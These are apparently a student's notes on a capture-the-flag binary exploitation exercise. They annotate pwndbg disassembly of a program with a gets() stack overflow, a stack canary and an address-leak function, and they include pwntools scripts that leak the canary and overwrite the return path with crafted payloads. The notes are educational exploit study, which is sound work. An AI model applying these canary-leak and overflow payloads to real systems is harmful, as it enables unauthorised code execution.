```as
Dump of assembler code for function UwU_main:
   0x0000555555400e27 <+0>:     push   rbp
   0x0000555555400e28 <+1>:     mov    rbp,rsp
```
# function prologue 
```
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdce0 —▸ 0x7fffffffdcf0 ◂— 1
01:0008│+008     0x7fffffffdce8 —▸ 0x555555401054 (main+165) ◂— lea rdi, [rip + 0x525] (return address)
```

```
   0x0000555555400e2b <+4>:     add    rsp,0xffffffffffffff80
```
here pwngdb shows that the instruction  is actually `add    rsp, -0x80`  allocating 128 bytes of the stack frame
but I am not sure why `0xffffffffffffff80` is `-0x80`. 
Claude:
```
In x86_64, negative numbers are represented in two's complement
0xffffffffffffff80 is the two's complement representation of -128 (or -0x80)
```


And why don't we subtract rsp instead of adding it by a negative value. (CPU optimization) 



```
   0x0000555555400e2f <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000555555400e38 <+17>:    mov    QWORD PTR [rbp-0x8],rax
```
here it is the canary obviously. Since it is from a value randomized in fs:0x28 section
So from $rbp to $rbp-0x8, it is where the canary is located.
```
pwndbg:

RAX, [0x7ffff7db0768] => 0x9456ea2d2bd5000 
```

We might be able to get it with the content leaking function `know_more_about UwU` 



```
   0x0000555555400e3c <+21>:    xor    eax,eax
   0x0000555555400e3e <+23>:    mov    QWORD PTR [rbp-0x70],0x557755
```
`xor eax, eax` zeros out the stuff 
just moving that weird vallue `0x557755` to `0x70` bytes below rbp
oh nevermind, it is apparently `char UwU[8] = "UwU";` 

# Printing bunch of stuff 
```c
	puts("Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ\n");

	puts("UwU knows that you may feel lose inside the world of UwU ψ(｀∇´)ψ\n");
	printf("Therefore, UwU is good enough to let you know you are in %p now（´◔ ₃ ◔`)\n", UwU_main);
	printf("and UwU is in %p\n\n", UwU);

	puts("Btw, do you want to know more about the world of UwU?");
	printf("* Please enter a choice (1:Yes, 2:Yes): ");
```



```
   0x0000555555400e46 <+31>:    lea    rdi,[rip+0x4db]        # 0x555555401328
   0x0000555555400e4d <+38>:    call   0x555555400a10 <puts@plt>
```

just putting something rdi as 1st argument and printing something
from the source c++ code, it is probably 
`"Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ\n"`

```
   0x0000555555400e52 <+43>:    lea    rdi,[rip+0x507]        # 0x555555401360
   0x0000555555400e59 <+50>:    call   0x555555400a10 <puts@plt>
```
```c
puts("UwU knows that you may feel lose inside the world of UwU ψ(｀∇´)ψ\n");
```
does similar thing, again just retriving something from rodata (most probably since its a string) and printing something

```as
   0x0000555555400e5e <+55>:    lea    rsi,[rip+0xffffffffffffffc2]        # 0x555555400e27 <UwU_main>                                                         
```
address of UwU_main gets loaded as second argument
```as   
   0x0000555555400e65 <+62>:    lea    rdi,[rip+0x544]        # 0x5555554013b0
```
address of the string again
```
   0x0000555555400e6c <+69>:    mov    eax,0x0
   0x0000555555400e71 <+74>:    call   0x555555400a30 <printf@plt>
```
```c
printf("Therefore, UwU is good enough to let you know you are in %p now（´◔ ₃ ◔`)\n", UwU_main);
```
```
   0x0000555555400e76 <+79>:    lea    rax,[rbp-0x70]
   0x0000555555400e7a <+83>:    mov    rsi,rax
```
loading the address of variable that stores `UwU` in rbp-0x70 as second argument

```
0x0000555555400e7d <+86>:    lea    rdi,[rip+0x57f]        # 0x555555401403
0x0000555555400e84 <+93>:    mov    eax,0x0
0x0000555555400e89 <+98>:    call   0x555555400a30 <printf@plt>
```
Equivalent to the following c part
```c
printf("and UwU is in %p\n\n", UwU);
```

```
0x0000555555400e8e <+103>:   lea    rdi,[rip+0x583]        # 0x555555401418
0x0000555555400e95 <+110>:   call   0x555555400a10 <puts@plt>
```
```c
puts("Btw, do you want to know more about the world of UwU?");
```

```as
0x0000555555400e9a <+115>:   lea    rdi,[rip+0x5af]        # 0x555555401450
0x0000555555400ea1 <+122>:   mov    eax,0x0
0x0000555555400ea6 <+127>:   call   0x555555400a30 <printf@plt>
```
```c
printf("* Please enter a choice (1:Yes, 2:Yes): ");
```


## weird instruction noting in pwndbg
```
0x555555400e46 <UwU_main+31>    lea    rdi, [rip + 0x4db]                   RDI => 0x555555401328 ◂— push rdi                                                                  
0x555555400e4d <UwU_main+38>    call   puts@plt                    <puts@plt>

0x555555400e52 <UwU_main+43>    lea    rdi, [rip + 0x507]                   RDI => 0x555555401360 ◂— push rbp                                                                  
► 0x555555400e59 <UwU_main+50>    call   puts@plt                    <puts@plt>
s: 0x555555401360 ◂— 0x776f6e6b20557755 ('UwU know')

0x555555400e5e <UwU_main+55>    lea    rsi, [rip - 0x3e]                    RSI => 0x555555400e27 (UwU_main) ◂— push rbp                                                       
0x555555400e65 <UwU_main+62>    lea    rdi, [rip + 0x544]                   RDI => 0x5555554013b0 ◂— push rsp 
```
here is somewhat the equivalent part in pwndbg which shows a lot of weird stuff like push rsp, push rdi, push rbp. Which is when the debugger trying to interpret theose string addresses as instruction



# Entrance to content leaking function
```c
    fgets(choice, 2, stdin);
	getchar();

	if ((atoi(choice) == 1) || (atoi(choice) == 2))
	{
		know_more_about_UwU();
	}
	else
	{
		puts("\nYou don't want to know more about UwU? (′゜ω。‵)\n");
    }
```


```
0x0000555555400eab <+132>:   mov    rdx,QWORD PTR [rip+0x20121e]        # 0x5555556020d0 <stdin@@GLIBC_2.2.5>
```
`stdin` going into `rdx` which would go in as 3rd argument into `fgets`

```
0x0000555555400eb2 <+139>:   lea    rax,[rbp-0x80]
0x0000555555400eb6 <+143>:   mov    esi,0x2
0x0000555555400ebb <+148>:   mov    rdi,rax
0x0000555555400ebe <+151>:   call   0x555555400a60 <fgets@plt>
```
2nd argument is is number `2` and first argument is address - `rbp-0x80`, aka `rsp`, where the buffer actually starts (hmm how many bytes would it write)


```
0x0000555555400ec3 <+156>:   call   0x555555400a80 <getchar@plt>
```
calls getchar to doing something (get the character and leaving the '\n' alone)


```
0x0000555555400ec8 <+161>:   lea    rax,[rbp-0x80]
0x0000555555400ecc <+165>:   mov    rdi,rax
0x0000555555400ecf <+168>:   call   0x555555400ae0 <atoi@plt>
0x0000555555400ed4 <+173>:   cmp    eax,0x1
0x0000555555400ed7 <+176>:   je     0x555555400eea <UwU_main+195>
0x0000555555400ed9 <+178>:   lea    rax,[rbp-0x80]
0x0000555555400edd <+182>:   mov    rdi,rax
0x0000555555400ee0 <+185>:   call   0x555555400ae0 <atoi@plt>
0x0000555555400ee5 <+190>:   cmp    eax,0x2
0x0000555555400ee8 <+193>:   jne    0x555555400ef6 <UwU_main+207>
0x0000555555400eea <+195>:   mov    eax,0x0
0x0000555555400eef <+200>:   call   0x555555400d97 <know_more_about_UwU>
0x0000555555400ef4 <+205>:   jmp    0x555555400f02 <UwU_main+219>
0x0000555555400ef6 <+207>:   lea    rdi,[rip+0x583]        # 0x555555401480
```
handles the conditional checking by moving the input which is stored in `rbp-0x80` with number 1 and 2 
since it is a `||` condition, it goes like:
```as
je (success address)
... (if not equal, prepare to compare with value `2`)
jne (fail address, since at this point it fails twice already)
```
`0x0000555555400ef4 <+205>:   jmp    0x555555400f02 <UwU_main+219>` this instruction ensures that if condition is matched, jumped to `know_more_about_UwU`, came back to (rip), the program would be directed to a specific instruction (rip)
actually it is just skipping the part that prints 
`puts("\nYou don't want to know more about UwU? (′゜ω。‵)\n");`
i.e. the else part

else :
```
0x0000555555400efd <+214>:   call   0x555555400a10 <puts@plt>
```
```
where program continues
0x0000555555400f02 <+219>:   lea    rdi,[rip+0x5b7]        # 0x5555554014c0
0x0000555555400f09 <+226>:   call   0x555555400a10 <puts@plt>
```

`gets(buffer);`
```
0x0000555555400f0e <+231>:   lea    rax,[rbp-0x60]
0x0000555555400f12 <+235>:   mov    rdi,rax
0x0000555555400f15 <+238>:   mov    eax,0x0
0x0000555555400f1a <+243>:   call   0x555555400ab0 <gets@plt>
```

`char *ptr = strstr(buffer, "UwU");`
```
0x0000555555400f1f <+248>:   lea    rax,[rbp-0x60]
0x0000555555400f23 <+252>:   lea    rsi,[rip+0x5e2]        # 0x55555540150c (probably "UwU")
0x0000555555400f2a <+259>:   mov    rdi,rax
0x0000555555400f2d <+262>:   call   0x555555400b00 <strstr@plt>
```


```
0x0000555555400f32 <+267>:   mov    QWORD PTR [rbp-0x78],rax
0x0000555555400f36 <+271>:   cmp    QWORD PTR [rbp-0x78],0x0
0x0000555555400f3b <+276>:   je     0x555555400f82 <UwU_main+347>
0x0000555555400f3d <+278>:   mov    rax,QWORD PTR [rbp-0x78]
0x0000555555400f41 <+282>:   lea    rsi,[rip+0x5c8]        # 0x555555401510
0x0000555555400f48 <+289>:   mov    rdi,rax
0x0000555555400f4b <+292>:   call   0x555555400b00 <strstr@plt>
0x0000555555400f50 <+297>:   test   rax,rax
0x0000555555400f53 <+300>:   je     0x555555400f82 <UwU_main+347>
0x0000555555400f55 <+302>:   lea    rdi,[rip+0x5bc]        # 0x555555401518
0x0000555555400f5c <+309>:   call   0x555555400a10 <puts@plt>
0x0000555555400f61 <+314>:   lea    rax,[rbp-0x70]
0x0000555555400f65 <+318>:   lea    rsi,[rip+0x5a0]        # 0x55555540150c
0x0000555555400f6c <+325>:   mov    rdi,rax
0x0000555555400f6f <+328>:   call   0x555555400a70 <strcmp@plt>
0x0000555555400f74 <+333>:   test   eax,eax
0x0000555555400f76 <+335>:   je     0x555555400f98 <UwU_main+369>
0x0000555555400f78 <+337>:   mov    edi,0x1
0x0000555555400f7d <+342>:   call   0x555555400af0 <exit@plt>
0x0000555555400f82 <+347>:   lea    rdi,[rip+0x5bf]        # 0x555555401548
```

```
0x0000555555400f89 <+354>:   call   0x555555400a10 <puts@plt>
0x0000555555400f8e <+359>:   mov    edi,0x1
0x0000555555400f93 <+364>:   call   0x555555400af0 <exit@plt>

```
0x0000555555400f98 <+369>:   nop don't know what this does

0x0000555555400f99 <+370>:   mov    rax,QWORD PTR [rbp-0x8]
0x0000555555400f9d <+374>:   xor    rax,QWORD PTR fs:0x28
0x0000555555400fa6 <+383>:   je     0x555555400fad <UwU_main+390>
0x0000555555400fa8 <+385>:   call   0x555555400a20 
<__stack_chk_fail@plt>
```

this is probably the most important part, 
`mov    rax,QWORD PTR [rbp-0x8]` retrieve the current value of where the canary was stored to see if it is still the same 
if yes, leave + ret (cant exploit)
if not, then it is going to call `0x0000555555400fa8 <+385>:   call   0x555555400a20 
<__stack_chk_fail@plt>
` which probably terminates the program 

```
pwndbg> ni
*** stack smashing detected ***: terminated
```
yes, that's eaxctly how it goes

```
0x0000555555400fad <+390>:   leave
0x0000555555400fae <+391>:   ret
```


## sending payload

In pwndbg/gdb, you can send binary data as input using several methods:

1. Using a pipe command:
```gdb
r < <(python3 -c "print('UwUUwU' + 'A'*90 + '\xef\xbe\xad\xde')")
```

2. Using pwndbg/gdb's built-in commands:
```gdb
r < <(echo -e "UwUUwU$(python3 -c 'print("A"*90)')\xde\xad\xbe\xef")
```

3. The most reliable way is to create a file with the payload and redirect:
```python
# create exploit.py
from pwn import *  # if you have pwntools installed

payload = b'UwUUwU' + b'A' * 90
payload += p64(0xdeadbeef)  # 8 bytes for 64-bit address

with open('payload.txt', 'wb') as f:
    f.write(payload)
```

Then in pwndbg:
```gdb
r < payload.txt
```

4. Using pwntools directly (if you're writing an exploit script):
```python
from pwn import *

p = process('./program')  # or gdb.debug('./program')
payload = b'UwUUwU' + b'A' * 90
payload += p64(0xdeadbeef)
p.sendline(payload)
```

For your specific case, I recommend method 3 or 4 since you're dealing with binary data and exact padding lengths. The file method ensures no bytes are interpreted as special characters by the shell.


## testing area 

0x7fffffffdce8

0xf61593ed0c38d300

UwUUwUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



# debugging with pwndbg with python script payload

To debug the exploit with pwndbg, you can modify the script to use GDB. Here's how:

```python
from pwn import * 

context.terminal = ['tmux', 'splitw', '-h']  # If you're using tmux
# context.terminal = ['gnome-terminal', '--'] # If you're using gnome-terminal

p = process("./program")
gdb.attach(p, '''
break main
continue
''')

# Rest of your exploit remains the same
p.recvuntil(b"UwU is in ")
uwu_addr = int(p.recvuntil(b"\n").strip(), 16)
print("[*] UwU address:", hex(uwu_addr))

rbp_addr = uwu_addr + 0x70
print("[*] RBP address:", hex(rbp_addr))

p.recvuntil(b"Please enter a choice (1:Yes, 2:Yes):")
p.sendline(b'1')

p.recvuntil(b"Please enter an address e.g. 0x7fffdeadbeef:")
canary_location = hex(rbp_addr - 8)
p.sendline(canary_location)
p.recvuntil(b"contains ")
leaked_canary = int(p.recvuntil(b"\n").strip(), 16)
print("[*] leaked canary:", hex(leaked_canary))
payload = b'UwUUwU' + b'A' * 82
payload += p64(leaked_canary)

p.sendline(payload)

p.interactive()
```

You can add more breakpoints or GDB commands in the `gdb.attach()` string. Here are some useful commands you might want to add:

```python
gdb.attach(p, '''
break main
break *vuln+99  # Break before the canary check
break *vuln+168 # Break at the win function call
continue

# Some useful commands to add:
# display/10gx $rsp  # Display 10 quad-words from stack
# x/gx $rbp-0x8     # Examine canary location
# vmmap             # Show memory mappings
''')
```

To run this:
1. Make sure you have tmux installed (or modify context.terminal for your terminal)
2. Run the script: `python3 solve.py`
3. A new pwndbg window will open where you can:
   - Use `c` to continue execution
   - Use `si` for step instruction
   - Use `ni` for next instruction
   - Use `x/gx $rbp-0x8` to examine the canary
   - Use `stack` to see the stack layout
   - Use `vmmap` to see memory mappings



Here are a few ways to integrate pwndbg with your script:

1. Using pause() at specific points:
```python
from pwn import * 

p = process("./program")

p.recvuntil(b"you are in ")
UwU_main_addr = int(p.recvuntil(b" ").strip(), 16)
print("[*] UwU_main address:", hex(UwU_main_addr))

# Add pause() where you want to inspect memory
pause()  # Script will pause here. In another terminal, run: gdb -p $(pidof program)

p.recvuntil(b"UwU is in ")
uwu_addr = int(p.recvuntil(b"\n").strip(), 16)
print("[*] UwU address:", hex(uwu_addr))

# Another pause point before sending payload
pause()  # You can attach gdb again here

# ... rest of your script
```

2. Using gdb.attach() with specific breakpoints:
```python
from pwn import * 

p = process("./program")

gdb.attach(p, '''
break *UwU_main
break *know_more_about_UwU
break *main+99  # Break at specific offset
commands 1      # Commands to run at breakpoint 1
    x/gx $rbp-0x8  # View canary
    stack 20       # View stack
    continue
end
continue
''')

# ... rest of your script
```

3. Create a debug function:
```python
from pwn import * 

def debug(p, script=None):
    if script:
        gdb.attach(p, script)
    else:
        gdb.attach(p)
    input("Continue?")  # Wait for your inspection

p = process("./program")

p.recvuntil(b"you are in ")
UwU_main_addr = int(p.recvuntil(b" ").strip(), 16)
print("[*] UwU_main address:", hex(UwU_main_addr))

# Call debug at interesting points
debug(p, '''
break *UwU_main
continue
''')

# ... rest of your script

# Debug before sending payload
debug(p, '''
x/gx $rbp-0x8
stack 20
''')

payload = b'UwUUwU' + b'A' * 82
# ... rest of your script
```

4. Run GDB first, then your script:
Terminal 1:
```bash
gdb ./program
(gdb) set follow-fork-mode child
(gdb) b *UwU_main
(gdb) b *know_more_about_UwU
(gdb) r
```

Terminal 2:
```python
# Your original script without gdb.attach()
```

The most flexible approach is probably using pause() or the debug function, as they let you:
- Inspect memory at any point
- Add/remove breakpoints dynamically
- Continue execution when you're done inspecting

Remember to check process ID if using pause():
```bash
ps aux | grep program  # Get PID
gdb -p <PID>          # Attach to running process
```


## location of deadbeef from rbp

```stack
pwndbg> stack
00:0000│ rsp   0x7fffcc34f7b0 ◂— 0
01:0008│-078   0x7fffcc34f7b8 ◂— 0x78fffffff9
02:0010│-070   0x7fffcc34f7c0 ◂— 0
03:0018│-068   0x7fffcc34f7c8 ◂— 0xcc34f628cc34f658
04:0020│-060   0x7fffcc34f7d0 —▸ 0x7fffcc34f948 —▸ 0x7fffcc3501fd ◂— './program'
05:0028│-058   0x7fffcc34f7d8 —▸ 0x559c65dde2a0 ◂— 0xfbad2488
06:0030│ rcx-5 0x7fffcc34f7e0 ◂— 0x3832303439 /* '94028' */
07:0038│-048   0x7fffcc34f7e8 —▸ 0x7fffcc34f958 —▸ 0x7fffcc350207 ◂— 'COLORFGBG=15;0'
pwndbg> telescope
00:0000│ rsp   0x7fffcc34f7b0 ◂— 0
01:0008│-078   0x7fffcc34f7b8 ◂— 0x78fffffff9
02:0010│-070   0x7fffcc34f7c0 ◂— 0
03:0018│-068   0x7fffcc34f7c8 ◂— 0xcc34f628cc34f658
04:0020│-060   0x7fffcc34f7d0 —▸ 0x7fffcc34f948 —▸ 0x7fffcc3501fd ◂— './program'
05:0028│-058   0x7fffcc34f7d8 —▸ 0x559c65dde2a0 ◂— 0xfbad2488
06:0030│ rcx-5 0x7fffcc34f7e0 ◂— 0x3832303439 /* '94028' */
07:0038│-048   0x7fffcc34f7e8 —▸ 0x7fffcc34f958 —▸ 0x7fffcc350207 ◂— 'COLORFGBG=15;0'
pwndbg> stack 50 
00:0000│ rsp   0x7fffcc34f7b0 ◂— 0
01:0008│-078   0x7fffcc34f7b8 ◂— 0x78fffffff9
02:0010│-070   0x7fffcc34f7c0 ◂— 0
03:0018│-068   0x7fffcc34f7c8 ◂— 0xcc34f628cc34f658
04:0020│-060   0x7fffcc34f7d0 —▸ 0x7fffcc34f948 —▸ 0x7fffcc3501fd ◂— './program'
05:0028│-058   0x7fffcc34f7d8 —▸ 0x559c65dde2a0 ◂— 0xfbad2488
06:0030│ rcx-5 0x7fffcc34f7e0 ◂— 0x3832303439 /* '94028' */
07:0038│-048   0x7fffcc34f7e8 —▸ 0x7fffcc34f958 —▸ 0x7fffcc350207 ◂— 'COLORFGBG=15;0'
08:0040│-040   0x7fffcc34f7f0 —▸ 0x7f1e0d54d000 (_rtld_global) —▸ 0x7f1e0d54e2e0 —▸ 0x559c4bc00000 ◂— jg 0x559c4bc00047                                                                         
09:0048│-038   0x7fffcc34f7f8 ◂— 0
0a:0050│-030   0x7fffcc34f800 —▸ 0x559c4bc00e10 (know_more_about_UwU+121) ◂— nop 
0b:0058│-028   0x7fffcc34f808 ◂— '0x559c4be020ec\n'
0c:0060│-020   0x7fffcc34f810 ◂— 0xa636530323065 /* 'e020ec\n' */
0d:0068│-018   0x7fffcc34f818 ◂— 0x1269fe9fe8d7ea00
... ↓          2 skipped
10:0080│ rbp   0x7fffcc34f830 ◂— 0x4141414141414141 ('AAAAAAAA')
11:0088│+008   0x7fffcc34f838 ◂— 0xdeadbeef
12:0090│+010   0x7fffcc34f840 ◂— 0xbeefdead
13:0098│+018   0x7fffcc34f848 —▸ 0x559c4bc00f00 (UwU_main+217) ◂— 0x5b73d8d48ffff
14:00a0│+020   0x7fffcc34f850 ◂— 0x100000000
15:00a8│+028   0x7fffcc34f858 —▸ 0x7fffcc34f948 —▸ 0x7fffcc3501fd ◂— './program'
16:00b0│+030   0x7fffcc34f860 —▸ 0x7fffcc34f948 —▸ 0x7fffcc3501fd ◂— './program'
17:00b8│+038   0x7fffcc34f868 ◂— 0xa6abf3d6dea36a2c
18:00c0│+040   0x7fffcc34f870 ◂— 0
19:00c8│+048   0x7fffcc34f878 —▸ 0x7fffcc34f958 —▸ 0x7fffcc350207 ◂— 'COLORFGBG=15;0'
1a:00d0│+050   0x7fffcc34f880 —▸ 0x7f1e0d54d000 (_rtld_global) —▸ 0x7f1e0d54e2e0 —▸ 0x559c4bc000
```

## Surprised thing:

1. didn't expect that know_more_about_UwU can actually return to UwU_flag
2. when I was on know_more_about_UwU the second time to leak passcode, didn't expect rbp+16 of the stack of UwU_main would be the return address of UwU_flag in know_more_about_UwU
3. didn't know about the location of arguments in the stack at all. What I did was to put deadbeef and beefdead somewhere randomly, do `stack 50` and just calculate the spaces between rbp+30 and rbp+18 (which are the locations that gets to compare arguments with 0xdeadbeef and 0xbeefdead, observed from assembly)

wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2.1_build/ghidra_11.2.1_PUBLIC_20241105.zip

unzip ghidra_11.2.1_PUBLIC_20241105.zip